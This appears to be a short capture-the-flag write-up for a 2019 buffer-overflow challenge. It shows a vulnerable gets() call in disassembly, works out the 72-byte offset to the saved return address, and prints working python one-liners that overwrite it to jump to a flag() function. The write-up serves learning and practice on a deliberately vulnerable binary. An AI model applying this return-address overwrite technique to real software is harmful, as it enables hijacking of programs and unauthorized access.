# Overflow 1

There is a simple get_return_address() call which lets us know when we overflow the return address with our input

```c
printf("Woah, were jumping to 0x%x !\n", get_return_address());
```

On taking a look at the disassembly of the vuln() function , we can clearly see that the input we give gets stored on to the buffer at [ebp-0x48]

``` assembly
 0x08048671 <+18>:    sub    esp,0xc
 0x08048674 <+21>:    lea    eax,[ebp-0x48]
 0x08048677 <+24>:    push   eax
 0x08048678 <+25>:    call   0x8048430 <gets@plt>
 0x0804867d <+30>:    add    esp,0x10
 0x08048680 <+33>:    call   0x8048714 <get_return_address>

```
So we need to give an input of 0x48 bytes + 0x4 bytes (to override the saved ebp) + 0x4 bytes (to override the saved eip)

```bash
arch3r@1nv4d3r:~/p1c0CTF_2019/0v3rflow$ python -c 'print("A"*72+"B"*4+"C"*4)' | ./vuln 
Give me a string and lets see what happens: 
Woah, were jumping to 0x43434343 !
Segmentation fault (core dumped)

```

Now , Instead of 4 C's we add in the address of the flag() function in the little endian format.
``` bash
arch3r@1nv4d3r:~/p1c0CTF_2019/0v3rflow$ python -c 'print("A"*72+"B"*4+"\xe6\x85\x04\x08")' | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
flag{0v3rfl0w_1}
```
and there's the flag..!
